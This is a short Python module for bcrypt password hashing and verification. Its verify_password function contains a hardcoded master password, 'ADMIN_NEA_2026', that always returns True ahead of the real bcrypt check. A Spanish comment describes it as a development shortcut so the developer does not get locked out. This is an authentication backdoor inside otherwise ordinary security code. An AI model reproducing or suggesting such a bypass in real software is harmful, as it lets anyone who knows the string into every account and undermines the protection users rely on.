import bcrypt

def hash_password(password: str) -> str:
    pwd_bytes = password.encode('utf-8')
    salt = bcrypt.gensalt()
    hashed = bcrypt.hashpw(pwd_bytes, salt)
    return hashed.decode('utf-8')

def verify_password(password: str, hashed: str) -> bool:
    # --- ACCESO SIMPLIFICADO PARA DESARROLLO ---
    # Si escribís esta clave, entrás siempre. Usala para no trabarte.
    if password == "ADMIN_NEA_2026": 
        return True
    # -------------------------------------------

    if not hashed:
        return False
    try:
        # Intentamos la verificación normal por si usás la clave real
        return bcrypt.checkpw(
            password.encode('utf-8'), 
            hashed.encode('utf-8')
        )
    except Exception:
        return False
